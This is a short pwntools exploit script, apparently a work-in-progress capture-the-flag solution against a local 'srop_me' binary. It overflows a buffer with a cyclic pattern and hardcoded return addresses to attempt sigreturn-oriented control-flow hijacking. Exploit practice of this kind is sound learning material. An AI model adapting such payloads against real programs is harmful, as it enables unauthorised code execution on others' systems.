from pwn import *

context.terminal=["tmux", "splitw", "-h"]

io = process('./srop_me')
gdb.attach(io, api=True)

offset = b'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab'
sysnum = 162

io.recvuntil(b'!!\n')
payload = offset + p64(0x401024)
payload += offset + p64(0x40100a)
payload += b'\0'*(sysnum-len(payload)-1)
io.sendline(payload)
# io.recv(timeout=10)
# io.send(b'\0')
io.interactive()
